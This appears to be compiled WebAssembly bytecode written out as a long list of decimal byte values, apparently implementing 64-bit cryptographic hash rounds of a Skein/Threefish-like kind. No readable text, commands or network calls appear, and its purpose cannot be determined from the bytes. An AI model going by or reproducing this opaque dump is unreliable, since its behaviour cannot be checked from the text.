19,66,42,134,32,19,66,22,136,132,32,22,133,34,13,124,34,17,124,33,19,32,18,32,13,66,49,134,32,13,66,15,136,132,32,17,133,34,18,124,33,21,32,14,66,39,134,32,14,66,25,136,132,32,23,133,34,14,32,15,66,14,134,32,15,66,50,136,132,32,16,133,34,15,32,22,124,34,16,124,34,17,32,31,124,32,20,66,44,134,32,20,66,20,136,132,32,19,133,32,30,124,34,13,124,33,20,32,19,32,37,124,32,26,66,9,124,32,14,66,9,134,32,14,66,55,136,132,32,17,133,124,34,14,124,33,22,32,13,66,39,134,32,13,66,25,136,132,32,20,133,34,19,32,15,66,36,134,32,15,66,28,136,132,32,16,133,34,15,32,23,124,34,16,32,29,124,32,18,66,56,134,32,18,66,8,136,132,32,21,133,32,28,124,34,13,124,34,17,124,33,18,32,20,32,13,66,30,134,32,13,66,34,136,132,32,17,133,34,20,124,33,23,32,14,66,24,134,32,14,66,40,136,132,32,22,133,34,14,32,21,32,27,124,32,15,66,54,134,32,15,66,10,136,132,32,16,133,32,38,124,34,15,124,34,16,124,34,17,32,19,66,13,134,32,19,66,51,136,132,32,18,133,34,13,124,33,19,32,14,66,50,134,32,14,66,14,136,132,32,17,133,34,14,32,18,124,33,21,32,13,66,25,134,32,13,66,39,136,132,32,19,133,34,18,32,15,66,34,134,32,15,66,30,136,132,32,16,133,34,15,32,22,124,34,16,32,20,66,17,134,32,20,66,47,136,132,32,23,133,34,13,124,34,17,124,33,20,32,19,32,13,66,29,134,32,13,66,35,136,132,32,17,133,34,19,124,33,22,32,14,66,43,134,32,14,66,21,136,132,32,21,133,34,14,32,15,66,10,134,32,15,66,54,136,132,32,16,133,34,15,32,23,124,34,16,124,34,17,32,30,124,32,18,66,8,134,32,18,66,56,136,132,32,20,133,32,29,124,34,13,124,33,18,32,20,32,39,124,32,32,66,10,124,32,14,66,35,134,32,14,66,29,136,132,32,17,133,124,34,14,124,33,23,32,13,66,46,134,32,13,66,18,136,132,32,18,133,34,20,32,15,66,39,134,32,15,66,25,136,132,32,16,133,34,15,32,21,124,34,16,32,28,124,32,19,66,22,134,32,19,66,42,136,132,32,22,133,32,27,124,34,13,124,34,17,124,33,19,32,18,32,13,66,36,134,32,13,66,28,136,132,32,17,133,34,18,124,33,21,32,14,66,37,134,32,14,66,27,136,132,32,23,133,34,14,32,22,32,24,124,32,15,66,56,134,32,15,66,8,136,132,32,16,133,32,37,124,34,15,124,34,16,124,34,17,32,20,66,33,134,32,20,66,31,136,132,32,19,133,34,13,124,33,20,32,14,66,27,134,32,14,66,37,136,132,32,17,133,34,14,32,19,124,33,22,32,13,66,17,134,32,13,66,47,136,132,32,20,133,34,19,32,15,66,19,134,32,15,66,45,136,132,32,16,133,34,15,32,23,124,34,16,32,18,66,42,134,32,18,66,22,136,132,32,21,133,34,13,124,34,17,124,33,18,32,20,32,13,66,49,134,32,13,66,15,136,132,32,17,133,34,20,124,33,23,32,14,66,39,134,32,14,66,25,136,132,32,22,133,34,14,32,15,66,14,134,32,15,66,50,136,132,32,16,133,34,15,32,21,124,34,16,124,34,17,32,29,124,32,19,66,44,134,32,19,66,20,136,132,32,18,133,32,28,124,34,13,124,33,19,32,18,32,40,124,32,31,66,11,124,32,14,66,9,134,32,14,66,55,136,132,32,17,133,124,34,14,124,33,21,32,13,66,39,134,32,13,66,25,136,132,32,19,133,34,18,32,15,66,36,134,32,15,66,28,136,132,32,16,133,34,15,32,22,124,34,16,32,27,124,32,20,66,56,134,32,20,66,8,136,132,32,23,133,32,24,124,34,13,124,34,17,124,33,20,32,19,32,13,66,30,134,32,13,66,34,136,132,32,17,133,34,19,124,33,22,32,14,66,24,134,32,14,66,40,136,132,32,21,133,34,14,32,23,32,25,124,32,15,66,54,134,32,15,66,10,136,132,32,16,133,32,39,124,34,15,124,34,16,124,34,17,32,18,66,13,134,32,18,66,51,136,132,32,20,133,34,13,124,33,18,32,14,66,50,134,32,14,66,14,136,132,32,17,133,34,14,32,20,124,33,23,32,13,66,25,134,32,13,66,39,136,132,32,18,133,34,20,32,15,66,34,134,32,15,66,30,136,132,32,16,133,34,15,32,21,124,34,16,32,19,66,17,134,32,19,66,47,136,132,32,22,133,34,13,124,34,17,124,33,19,32,18,32,13,66,29,134,32,13,66,35,136,132,32,17,133,34,18,124,33,21,32,14,66,43,134,32,14,66,21,136,132,32,23,133,34,14,32,15,66,10,134,32,15,66,54,136,132,32,16,133,34,15,32,22,124,34,16,124,34,17,32,28,124,32,20,66,8,134,32,20,66,56,136,132,32,19,133,32,27,124,34,13,124,33,20,32,19,32,41,124,32,30,66,12,124,32,14,66,35,134,32,14,66,29,136,132,32,17,133,124,34,14,124,33,22,32,13,66,46,134,32,13,66,18,136,132,32,20,133,34,19,32,15,66,39,134,32,15,66,25,136,132,32,16,133,34,15,32,23,124,34,16,32,24,124,32,18,66,22,134,32,18,66,42,136,132,32,21,133,32,25,124,34,13,124,34,17,124,33,18,32,20,32,13,66,36,134,32,13,66,28,136,132,32,17,133,34,20,124,33,23,32,14,66,37,134,32,14,66,27,136,132,32,22,133,34,14,32,21,32,26,124,32,15,66,56,134,32,15,66,8,136,132,32,16,133,32,40,124,34,15,124,34,16,124,34,17,32,19,66,33,134,32,19,66,31,136,132,32,18,133,34,13,124,33,19,32,14,66,27,134,32,14,66,37,136,132,32,17,133,34,14,32,18,124,33,21,32,13,66,17,134,32,13,66,47,136,132,32,19,133,34,18,32,15,66,19,134,32,15,66,45,136,132,32,16,133,34,15,32,22,124,34,16,32,20,66,42,134,32,20,66,22,136,132,32,23,133,34,13,124,34,17,124,33,20,32,19,32,13,66,49,134,32,13,66,15,136,132,32,17,133,34,19,124,33,22,32,14,66,39,134,32,14,66,25,136,132,32,21,133,34,14,32,15,66,14,134,32,15,66,50,136,132,32,16,133,34,15,32,23,124,34,16,124,34,17,32,27,124,32,18,66,44,134,32,18,66,20,136,132,32,20,133,32,24,124,34,13,124,33,18,32,20,32,42,124,32,29,66,13,124,32,14,66,9,134,32,14,66,55,136,132,32,17,133,124,34,14,124,33,23,32,13,66,39,134,32,13,66,25,136,132,32,18,133,34,20,32,15,66,36,134,32,15,66,28,136,132,32,16,133,34,15,32,21,124,34,16,32,25,124,32,19,66,56,134,32,19,66,8,136,132,32,22,133,32,26,124,34,13,124,34,17,124,33,19,32,18,32,13,66,30,134,32,13,66,34,136,132,32,17,133,34,18,124,33,21,32,14,66,24,134,32,14,66,40,136,132,32,23,133,34,14,32,22,32,32,124,32,15,66,54,134,32,15,66,10,136,132,32,16,133,32,41,124,34,15,124,34,16,124,34,17,32,20,66,13,134,32,20,66,51,136,132,32,19,133,34,13,124,33,20,32,14,66,50,134,32,14,66,14,136,132,32,17,133,34,14,32,19,124,33,22,32,13,66,25,134,32,13,66,39,136,132,32,20,133,34,19,32,15,66,34,134,32,15,66,30,136,132,32,16,133,34,15,32,23,124,34,16,32,18,66,17,134,32,18,66,47,136,132,32,21,133,34,13,124,34,17,124,33,18,32,20,32,13,66,29,134,32,13,66,35,136,132,32,17,133,34,20,124,33,23,32,14,66,43,134,32,14,66,21,136,132,32,22,133,34,14,32,15,66,10,134,32,15,66,54,136,132,32,16,133,34,15,32,21,124,34,16,124,34,17,32,24,124,32,19,66,8,134,32,19,66,56,136,132,32,18,133,32,25,124,34,13,124,33,19,32,18,32,33,124,32,28,66,14,124,32,14,66,35,134,32,14,66,29,136,132,32,17,133,124,34,14,124,33,21,32,13,66,46,134,32,13,66,18,136,132,32,19,133,34,18,32,15,66,39,134,32,15,66,25,136,132,32,16,133,34,15,32,22,124,34,16,32,26,124,32,20,66,22,134,32,20,66,42,136,132,32,23,133,32,32,124,34,13,124,34,17,124,33,20,32,19,32,13,66,36,134,32,13,66,28,136,132,32,17,133,34,19,124,33,22,32,14,66,37,134,32,14,66,27,136,132,32,21,133,34,14,32,23,32,31,124,32,15,66,56,134,32,15,66,8,136,132,32,16,133,32,42,124,34,15,124,34,16,124,34,17,32,18,66,33,134,32,18,66,31,136,132,32,20,133,34,13,124,33,18,32,14,66,27,134,32,14,66,37,136,132,32,17,133,34,14,32,20,124,33,23,32,13,66,17,134,32,13,66,47,136,132,32,18,133,34,20,32,15,66,19,134,32,15,66,45,136,132,32,16,133,34,15,32,21,124,34,16,32,19,66,42,134,32,19,66,22,136,132,32,22,133,34,13,124,34,17,124,33,19,32,18,32,13,66,49,134,32,13,66,15,136,132,32,17,133,34,18,124,33,21,32,14,66,39,134,32,14,66,25,136,132,32,23,133,34,14,32,15,66,14,134,32,15,66,50,136,132,32,16,133,34,15,32,22,124,34,16,124,34,17,32,25,124,32,20,66,44,134,32,20,66,20,136,132,32,19,133,32,26,124,34,13,124,33,20,32,19,32,43,124,32,27,66,15,124,32,14,66,9,134,32,14,66,55,136,132,32,17,133,124,34,14,124,33,22,32,13,66,39,134,32,13,66,25,136,132,32,20,133,34,19,32,15,66,36,134,32,15,66,28,136,132,32,16,133,34,15,32,23,124,34,16,32,32,124,32,18,66,56,134,32,18,66,8,136,132,32,21,133,32,31,124,34,13,124,34,17,124,33,18,32,20,32,13,66,30,134,32,13,66,34,136,132,32,17,133,34,20,124,33,23,32,14,66,24,134,32,14,66,40,136,132,32,22,133,34,14,32,21,32,30,124,32,15,66,54,134,32,15,66,10,136,132,32,16,133,32,33,124,34,15,124,34,16,124,34,17,32,19,66,13,134,32,19,66,51,136,132,32,18,133,34,13,124,33,19,32,14,66,50,134,32,14,66,14,136,132,32,17,133,34,14,32,18,124,33,33,32,13,66,25,134,32,13,66,39,136,132,32,19,133,34,21,32,15,66,34,134,32,15,66,30,136,132,32,16,133,34,18,32,22,124,34,16,32,20,66,17,134,32,20,66,47,136,132,32,23,133,34,13,124,34,17,124,33,15,32,19,32,13,66,29,134,32,13,66,35,136,132,32,17,133,34,20,124,33,22,32,14,66,43,134,32,14,66,21,136,132,32,33,133,34,14,32,18,66,10,134,32,18,66,54,136,132,32,16,133,34,19,32,23,124,34,16,124,34,17,32,26,124,32,21,66,8,134,32,21,66,56,136,132,32,15,133,32,32,124,34,13,124,33,18,32,15,32,35,124,32,24,66,16,124,32,14,66,35,134,32,14,66,29,136,132,32,17,133,124,34,14,124,33,23,32,13,66,46,134,32,13,66,18,136,132,32,18,133,34,15,32,19,66,39,134,32,19,66,25,136,132,32,16,133,34,13,32,33,124,34,17,32,31,124,32,20,66,22,134,32,20,66,42,136,132,32,22,133,32,30,124,34,16,124,34,24,124,33,20,32,18,32,16,66,36,134,32,16,66,28,136,132,32,24,133,34,19,124,33,21,32,14,66,37,134,32,14,66,27,136,132,32,23,133,34,14,32,22,32,29,124,32,13,66,56,134,32,13,66,8,136,132,32,17,133,32,43,124,34,13,124,34,17,124,34,24,32,15,66,33,134,32,15,66,31,136,132,32,20,133,34,16,124,33,18,32,14,66,27,134,32,14,66,37,136,132,32,24,133,34,15,32,20,124,33,22,32,16,66,17,134,32,16,66,47,136,132,32,18,133,34,14,32,13,66,19,134,32,13,66,45,136,132,32,17,133,34,13,32,23,124,34,17,32,19,66,42,134,32,19,66,22,136,132,32,21,133,34,16,124,34,24,124,33,19,32,18,32,16,66,49,134,32,16,66,15,136,132,32,24,133,34,18,124,33,20,32,15,66,39,134,32,15,66,25,136,132,32,22,133,34,16,32,13,66,14,134,32,13,66,50,136,132,32,17,133,34,15,32,21,124,34,17,124,34,24,32,32,124,32,14,66,44,134,32,14,66,20,136,132,32,19,133,32,31,124,34,13,124,33,14,32,19,32,38,124,32,25,66,17,124,32,16,66,9,134,32,16,66,55,136,132,32,24,133,124,34,16,124,33,21,32,13,66,39,134,32,13,66,25,136,132,32,14,133,34,19,32,15,66,36,134,32,15,66,28,136,132,32,17,133,34,13,32,22,124,34,24,32,30,124,32,18,66,56,134,32,18,66,8,136,132,32,20,133,32,29,124,34,17,124,34,25,124,33,18,32,14,32,17,66,30,134,32,17,66,34,136,132,32,25,133,34,15,124,33,22,32,16,66,24,134,32,16,66,40,136,132,32,21,133,34,16,32,20,32,28,124,32,13,66,54,134,32,13,66,10,136,132,32,24,133,32,35,124,34,14,124,34,24,124,34,25,32,19,66,13,134,32,19,66,51,136,132,32,18,133,34,17,124,33,13,32,16,66,50,134,32,16,66,14,136,132,32,25,133,34,16,32,18,124,33,20,32,17,66,25,134,32,17,66,39,136,132,32,13,133,34,19,32,14,66,34,134,32,14,66,30,136,132,32,24,133,34,18,32,21,124,34,24,32,15,66,17,134,32,15,66,47,136,132,32,22,133,34,17,124,34,25,124,33,15,32,13,32,17,66,29,134,32,17,66,35,136,132,32,25,133,34,14,124,33,13,32,3,32,16,66,43,134,32,16,66,21,136,132,32,20,133,34,16,32,18,66,10,134,32,18,66,54,136,132,32,24,133,34,24,32,22,124,34,25,124,34,17,32,31,124,32,47,133,34,31,55,3,0,32,12,32,19,66,8,134,32,19,66,56,136,132,32,15,133,32,30,124,32,48,133,34,30,55,3,0,32,11,32,24,66,39,134,32,24,66,25,136,132,32,25,133,34,24,32,20,124,34,25,32,29,124,32,51,133,34,29,55,3,0,32,10,32,14,66,22,134,32,14,66,42,136,132,32,13,133,32,28,124,32,52,133,34,28,55,3,0,32,9,32,13,32,27,124,32,53,133,34,27,55,3,0,32,8,32,24,66,56,134,32,24,66,8,136,132,32,25,133,32,38,124,32,54,133,34,24,55,3,0,32,7,32,15,32,37,124,32,49,133,34,25,55,3,0,32,6,32,26,66,18,124,32,16,66,35,134,32,16,66,29,136,132,32,17,133,124,32,50,133,34,26,55,3,0,32,34,66,255,255,255,255,255,255,255,255,191,127,131,33,34,32,2,65,127,106,34,2,4,64,32,0,33,1,12,1,11,11,32,4,32,46,32,45,66,1,124,32,44,126,124,55,3,0,32,5,32,34,55,3,0,11,236,10,1,67,127,35,4,33,3,35,4,65,128,2,106,36,4,32,2,65,63,76,4,64,32,3,36,4,15,11,32,3,65,192,0,106,33,4,32,3,65,192,1,106,34,5,65,4,106,33,8,32,5,65,8,106,33,9,32,5,65,12,106,33,10,32,5,65,16,106,33,11,32,5,65,20,106,33,12,32,5,65,24,106,33,13,32,5,65,28,106,33,14,32,5,65,32,106,33,15,32,5,65,36,106,33,16,32,5,65,40,106,33,17,32,5,65,44,106,33,18,32,5,65,48,106,33,19,32,5,65,52,106,33,20,32,5,65,56,106,33,21,32,5,65,60,106,33,22,32,3,65,128,1,106,34,6,65,4,106,33,55,32,6,65,8,106,33,56,32,6,65,12,106,33,57,32,6,65,16,106,33,58,32,6,65,20,106,33,59,32,6,65,24,106,33,60,32,6,65,28,106,33,61,32,6,65,32,106,33,62,32,6,65,36,106,33,63,32,6,65,40,106,33,64,32,6,65,44,106,33,65,32,6,65,48,106,33,66,32,6,65,52,106,33,67,32,6,65,56,106,33,68,32,6,65,60,106,33,69,32,0,65,192,0,106,33,23,32,0,65,196,0,106,33,24,32,0,65,44,106,34,25,40,2,0,33,26,32,0,65,48,106,34,27,40,2,0,33,28,32,0,65,52,106,34,29,40,2,0,33,30,32,0,65,56,106,34,31,40,2,0,33,32,32,0,65,60,106,34,33,40,2,0,33,34,32,0,65,4,106,34,35,40,2,0,33,36,32,0,65,8,106,34,37,40,2,0,33,38,32,0,65,12,106,34,39,40,2,0,33,40,32,0,65,16,106,34,41,40,2,0,33,42,32,0,65,20,106,34,43,40,2,0,33,44,32,0,65,24,106,34,45,40,2,0,33,46,32,0,65,28,106,34,47,40,2,0,33,48,32,0,65,32,106,34,49,40,2,0,33,50,32,0,65,36,106,34,51,40,2,0,33,52,32,0,65,40,106,34,53,40,2,0,33,54,3,64,32,3,32,1,41,2,0,55,2,0,32,3,32,1,41,2,8,55,2,8,32,3,32,1,41,2,16,55,2,16,32,3,32,1,41,2,24,55,2,24,32,3,32,1,41,2,32,55,2,32,32,3,32,1,41,2,40,55,2,40,32,3,32,1,41,2,48,55,2,48,32,3,32,1,41,2,56,55,2,56,32,5,32,0,40,2,0,32,1,40,2,0,115,54,2,0,32,8,32,1,40,2,4,32,36,115,54,2,0,32,9,32,1,40,2,8,32,38,115,54,2,0,32,10,32,1,40,2,12,32,40,115,54,2,0,32,11,32,1,40,2,16,32,42,115,54,2,0,32,12,32,1,40,2,20,32,44,115,54,2,0,32,13,32,1,40,2,24,32,46,115,54,2,0,32,14,32,1,40,2,28,32,48,115,54,2,0,32,15,32,1,40,2,32,32,50,115,54,2,0,32,16,32,1,40,2,36,32,52,115,54,2,0,32,17,32,1,40,2,40,32,54,115,54,2,0,32,18,32,1,40,2,44,32,26,115,54,2,0,32,19,32,1,40,2,48,32,28,115,54,2,0,32,20,32,1,40,2,52,32,30,115,54,2,0,32,21,32,1,40,2,56,32,32,115,54,2,0,32,22,32,1,40,2,60,32,34,115,54,2,0,32,3,32,4,65,0,16,13,32,4,32,3,65,128,128,128,8,16,13,32,3,32,4,65,128,128,128,16,16,13,32,4,32,3,65,128,128,128,24,16,13,32,3,32,4,65,128,128,128,32,16,13,32,4,32,3,65,128,128,128,40,16,13,32,3,32,4,65,128,128,128,48,16,13,32,4,32,3,65,128,128,128,56,16,13,32,3,32,4,65,128,128,128,192,0,16,13,32,4,32,6,65,128,128,128,200,0,16,13,32,5,32,4,65,0,16,10,32,4,32,3,65,1,16,10,32,3,32,4,65,2,16,10,32,4,32,3,65,3,16,10,32,3,32,4,65,4,16,10,32,4,32,3,65,5,16,10,32,3,32,4,65,6,16,10,32,4,32,3,65,7,16,10,32,3,32,4,65,8,16,10,32,4,32,5,65,9,16,10,32,0,32,6,40,2,0,32,5,40,2,0,115,32,0,40,2,0,115,54,2,0,32,35,32,55,40,2,0,32,8,40,2,0,115,32,35,40,2,0,115,34,36,54,2,0,32,37,32,56,40,2,0,32,9,40,2,0,115,32,37,40,2,0,115,34,38,54,2,0,32,39,32,57,40,2,0,32,10,40,2,0,115,32,39,40,2,0,115,34,40,54,2,0,32,41,32,58,40,2,0,32,11,40,2,0,115,32,41,40,2,0,115,34,42,54,2,0,32,43,32,59,40,2,0,32,12,40,2,0,115,32,43,40,2,0,115,34,44,54,2,0,32,45,32,60,40,2,0,32,13,40,2,0,115,32,45,40,2,0,115,34,46,54,2,0,32,47,32,61,40,2,0,32,14,40,2,0,115,32,47,40,2,0,115,34,48,54,2,0,32,49,32,62,40,2,0,32,15,40,2,0,115,32,49,40,2,0,115,34,50,54,2,0,32,51,32,63,40,2,0,32,16,40,2,0,115,32,51,40,2,0,115,34,52,54,2,0,32,53,32,64,40,2,0,32,17,40,2,0,115,32,53,40,2,0,115,34,54,54,2,0,32,25,32,65,40,2,0,32,18,40,2,0,115,32,25,40,2,0,115,34,26,54,2,0,32,27,32,66,40,2,0,32,19,40,2,0,115,32,27,40,2,0,115,34,28,54,2,0,32,29,32,67,40,2,0,32,20,40,2,0,115,32,29,40,2,0,115,34,30,54,2,0,32,31,32,68,40,2,0,32,21,40,2,0,115,32,31,40,2,0,115,34,32,54,2,0,32,33,32,69,40,2,0,32,22,40,2,0,115,32,33,40,2,0,115,34,34,54,2,0,32,23,32,23,40,2,0,65,1,106,34,7,54,2,0,32,7,69,4,64,32,24,32,24,40,2,0,65,1,106,54,2,0,11,32,2,65,64,106,33,7,32,1,65,192,0,106,33,1,32,2,65,255,0,74,4,64,32,7,33,2,12,1,11,11,32,3,36,4,11,175,27,2,5,127,27,126,32,3,173,33,29,32,2,65,127,106,173,33,30,32,0,65,8,106,34,3,41,3,0,34,31,33,27,32,0,65,16,106,34,4,41,3,0,33,25,32,0,65,48,106,34,5,41,3,0,33,22,32,0,65,40,106,34,6,41,3,0,33,16,32,0,65,32,106,34,7,41,3,0,33,23,32,0,65,24,106,34,8,41,3,0,33,17,3,64,32,27,32,29,124,34,27,32,25,133,33,14,32,1,65,32,106,33,0,32,1,41,0,16,34,32,32,25,32,16,124,34,18,124,32,1,41,0,24,34,33,32,22,124,34,15,124,33,24,32,15,66,16,134,32,15,66,48,136,132,32,24,133,34,15,32,1,41,0,0,34,34,32,17,124,32,1,41,0,8,34,35,32,27,32,23,124,34,20,124,34,19,124,34,10,124,33,9,32,15,66,52,134,32,15,66,12,136,132,32,9,133,34,15,32,19,66,14,134,32,19,66,50,136,132,32,10,133,34,19,32,24,124,34,21,124,33,24,32,15,66,40,134,32,15,66,24,136,132,32,24,133,34,10,32,19,66,57,134,32,19,66,7,136,132,32,21,133,34,15,32,9,124,34,9,124,33,19,32,15,66,23,134,32,15,66,41,136,132,32,9,133,34,9,32,24,124,34,11,32,14,32,22,124,34,24,124,32,22,66,162,180,240,207,170,251,198,232,27,133,32,16,133,32,23,133,32,17,133,34,15,66,1,124,32,10,66,5,134,32,10,66,59,136,132,32,19,133,124,34,10,124,33,21,32,10,66,33,134,32,10,66,31,136,132,32,21,133,34,10,32,19,32,23,124,32,9,66,37,134,32,9,66,27,136,132,32,11,133,32,18,124,34,19,124,34,11,124,33,9,32,10,66,46,134,32,10,66,18,136,132,32,9,133,34,10,32,19,66,25,134,32,19,66,39,136,132,32,11,133,34,19,32,21,124,34,11,124,33,21,32,10,66,22,134,32,10,66,42,136,132,32,21,133,34,10,32,19,66,12,134,32,19,66,52,136,132,32,11,133,34,19,32,9,124,34,11,124,33,9,32,19,66,58,134,32,19,66,6,136,132,32,11,133,34,11,32,21,124,34,12,32,15,32,27,124,34,19,124,32,17,66,2,124,32,10,66,32,134,32,10,66,32,136,132,32,9,133,124,34,10,124,33,21,32,10,66,16,134,32,10,66,48,136,132,32,21,133,34,10,32,9,32,16,124,32,11,66,32,134,32,11,66,32,136,132,32,12,133,32,24,124,34,9,124,34,12,124,33,11,32,10,66,52,134,32,10,66,12,136,132,32,11,133,34,10,32,9,66,14,134,32,9,66,50,136,132,32,12,133,34,9,32,21,124,34,12,124,33,21,32,10,66,40,134,32,10,66,24,136,132,32,21,133,34,10,32,9,66,57,134,32,9,66,7,136,132,32,12,133,34,9,32,11,124,34,12,124,33,11,32,9,66,23,134,32,9,66,41,136,132,32,12,133,34,9,32,21,124,34,13,32,25,32,17,124,34,21,124,32,23,66,3,124,32,10,66,5,134,32,10,66,59,136,132,32,11,133,124,34,10,124,33,12,32,10,66,33,134,32,10,66,31,136,132,32,12,133,34,10,32,11,32,22,124,32,9,66,37,134,32,9,66,27,136,132,32,13,133,32,19,124,34,9,124,34,13,124,33,11,32,10,66,46,134,32,10,66,18,136,132,32,11,133,34,10,32,9,66,25,134,32,9,66,39,136,132,32,13,133,34,9,32,12,124,34,13,124,33,12,32,10,66,22,134,32,10,66,42,136,132,32,12,133,34,10,32,9,66,12,134,32,9,66,52,136,132,32,13,133,34,9,32,11,124,34,13,124,33,11,32,9,66,58,134,32,9,66,6,136,132,32,13,133,34,9,32,12,124,34,13,32,14,32,23,124,34,26,124,32,16,66,4,124,32,10,66,32,134,32,10,66,32,136,132,32,11,133,124,34,10,124,33,12,32,10,66,16,134,32,10,66,48,136,132,32,12,133,34,10,32,11,32,15,124,32,9,66,32,134,32,9,66,32,136,132,32,13,133,32,21,124,34,9,124,34,13,124,33,11,32,10,66,52,134,32,10,66,12,136,132,32,11,133,34,10,32,9,66,14,134,32,9,66,50,136,132,32,13,133,34,9,32,12,124,34,13,124,33,12,32,10,66,40,134,32,10,66,24,136,132,32,12,133,34,10,32,9,66,57,134,32,9,66,7,136,132,32,13,133,34,9,32,11,124,34,13,124,33,11,32,9,66,23,134,32,9,66,41,136,132,32,13,133,34,9,32,12,124,34,13,32,27,32,16,124,34,28,124,32,22,66,5,124,32,10,66,5,134,32,10,66,59,136,132,32,11,133,124,34,10,124,33,12,32,10,66,33,134,32,10,66,31,136,132,32,12,133,34,10,32,11,32,17,124,32,9,66,37,134,32,9,66,27,136,132,32,13,133,32,26,124,34,9,124,34,13,124,33,11,32,10,66,46,134,32,10,66,18,136,132,32,11,133,34,10,32,9,66,25,134,32,9,66,39,136,132,32,13,133,34,9,32,12,124,34,13,124,33,12,32,10,66,22,134,32,10,66,42,136,132,32,12,133,34,10,32,9,66,12,134,32,9,66,52,136,132,32,13,133,34,9,32,11,124,34,13,124,33,11,32,9,66,58,134,32,9,66,6,136,132,32,13,133,34,9,32,12,124,34,13,32,25,32,22,124,34,26,124,32,15,66,6,124,32,10,66,32,134,32,10,66,32,136,132,32,11,133,124,34,10,124,33,12,32,10,66,16,134,32,10,66,48,136,132,32,12,133,34,10,32,11,32,23,124,32,9,66,32,134,32,9,66,32,136,132,32,13,133,32,28,124,34,9,124,34,13,124,33,11,32,10,66,52,134,32,10,66,12,136,132,32,11,133,34,10,32,9,66,14,134,32,9,66,50,136,132,32,13,133,34,9,32,12,124,34,13,124,33,12,32,10,66,40,134,32,10,66,24,136,132,32,12,133,34,10,32,9,66,57,134,32,9,66,7,136,132,32,13,133,34,9,32,11,124,34,13,124,33,11,32,9,66,23,134,32,9,66,41,136,132,32,13,133,34,9,32,12,124,34,13,32,15,32,14,124,34,28,124,32,17,66,7,124,32,10,66,5,134,32,10,66,59,136,132,32,11,133,124,34,10,124,33,12,32,10,66,33,134,32,10,66,31,136,132,32,12,133,34,10,32,11,32,16,124,32,9,66,37,134,32,9,66,27,136,132,32,13,133,32,26,124,34,9,124,34,13,124,33,11,32,10,66,46,134,32,10,66,18,136,132,32,11,133,34,10,32,9,66,25,134,32,9,66,39,136,132,32,13,133,34,9,32,12,124,34,13,124,33,12,32,10,66,22,134,32,10,66,42,136,132,32,12,133,34,10,32,9,66,12,134,32,9,66,52,136,132,32,13,133,34,9,32,11,124,34,13,124,33,11,32,9,66,58,134,32,9,66,6,136,132,32,13,133,34,9,32,12,124,34,13,32,27,32,17,124,34,26,124,32,23,66,8,124,32,10,66,32,134,32,10,66,32,136,132,32,11,133,124,34,10,124,33,12,32,10,66,16,134,32,10,66,48,136,132,32,12,133,34,10,32,11,32,22,124,32,9,66,32,134,32,9,66,32,136,132,32,13,133,32,28,124,34,9,124,34,13,124,33,11,32,10,66,52,134,32,10,66,12,136,132,32,11,133,34,10,32,9,66,14,134,32,9,66,50,136,132,32,13,133,34,9,32,12,124,34,13,124,33,12,32,10,66,40,134,32,10,66,24,136,132,32,12,133,34,10,32,9,66,57,134,32,9,66,7,136,132,32,13,133,34,9,32,11,124,34,13,124,33,11,32,9,66,23,134,32,9,66,41,136,132,32,13,133,34,9,32,12,124,34,13,32,25,32,23,124,34,28,124,32,16,66,9,124,32,10,66,5,134,32,10,66,59,136,132,32,11,133,124,34,10,124,33,12,32,10,66,33,134,32,10,66,31,136,132,32,12,133,34,10,32,11,32,15,124,32,9,66,37,134,32,9,66,27,136,132,32,13,133,32,26,124,34,9,124,34,13,124,33,11,32,10,66,46,134,32,10,66,18,136,132,32,11,133,34,10,32,9,66,25,134,32,9,66,39,136,132,32,13,133,34,9,32,12,124,34,13,124,33,12,32,10,66,22,134,32,10,66,42,136,132,32,12,133,34,10,32,9,66,12,134,32,9,66,52,136,132,32,13,133,34,9,32,11,124,34,13,124,33,11,32,9,66,58,134,32,9,66,6,136,132,32,13,133,34,9,32,12,124,34,13,32,14,32,16,124,34,26,124,32,22,66,10,124,32,10,66,32,134,32,10,66,32,136,132,32,11,133,124,34,10,124,33,12,32,10,66,16,134,32,10,66,48,136,132,32,12,133,34,10,32,11,32,17,124,32,9,66,32,134,32,9,66,32,136,132,32,13,133,32,28,124,34,9,124,34,13,124,33,11,32,10,66,52,134,32,10,66,12,136,132,32,11,133,34,10,32,9,66,14,134,32,9,66,50,136,132,32,13,133,34,9,32,12,124,34,13,124,33,12,32,10,66,40,134,32,10,66,24,136,132,32,12,133,34,10,32,9,66,57,134,32,9,66,7,136,132,32,13,133,34,9,32,11,124,34,13,124,33,11,32,9,66,23,134,32,9,66,41,136,132,32,13,133,34,9,32,12,124,34,13,32,27,32,22,124,34,28,124,32,15,66,11,124,32,10,66,5,134,32,10,66,59,136,132,32,11,133,124,34,10,124,33,12,32,10,66,33,134,32,10,66,31,136,132,32,12,133,34,10,32,11,32,23,124,32,9,66,37,134,32,9,66,27,136,132,32,13,133,32,26,124,34,9,124,34,13,124,33,11,32,10,66,46,134,32,10,66,18,136,132,32,11,133,34,10,32,9,66,25,134,32,9,66,39,136,132,32,13,133,34,9,32,12,124,34,13,124,33,12,32,10,66,22,134,32,10,66,42,136,132,32,12,133,34,10,32,9,66,12,134,32,9,66,52,136,132,32,13,133,34,9,32,11,124,34,13,124,33,11,32,9,66,58,134,32,9,66,6,136,132,32,13,133,34,9,32,12,124,34,13,32,15,32,25,124,34,26,124,32,17,66,12,124,32,10,66,32,134,32,10,66,32,136,132,32,11,133,124,34,10,124,33,12,32,10,66,16,134,32,10,66,48,136,132,32,12,133,34,10,32,11,32,16,124,32,9,66,32,134,32,9,66,32,136,132,32,13,133,32,28,124,34,9,124,34,13,124,33,11,32,10,66,52,134,32,10,66,12,136,132,32,11,133,34,10,32,9,66,14,134,32,9,66,50,136,132,32,13,133,34,9,32,12,124,34,13,124,33,12,32,10,66,40,134,32,10,66,24,136,132,32,12,133,34,10,32,9,66,57,134,32,9,66,7,136,132,32,13,133,34,9,32,11,124,34,13,124,33,11,32,9,66,23,134,32,9,66,41,136,132,32,13,133,34,9,32,12,124,34,12,32,14,32,17,124,34,13,124,32,23,66,13,124,32,10,66,5,134,32,10,66,59,136,132,32,11,133,124,34,14,124,33,10,32,14,66,33,134,32,14,66,31,136,132,32,10,133,34,14,32,11,32,22,124,32,9,66,37,134,32,9,66,27,136,132,32,12,133,32,26,124,34,9,124,34,12,124,33,11,32,14,66,46,134,32,14,66,18,136,132,32,11,133,34,14,32,9,66,25,134,32,9,66,39,136,132,32,12,133,34,9,32,10,124,34,12,124,33,10,32,14,66,22,134,32,14,66,42,136,132,32,10,133,34,14,32,9,66,12,134,32,9,66,52,136,132,32,12,133,34,9,32,11,124,34,12,124,33,11,32,9,66,58,134,32,9,66,6,136,132,32,12,133,34,9,32,10,124,34,12,32,20,124,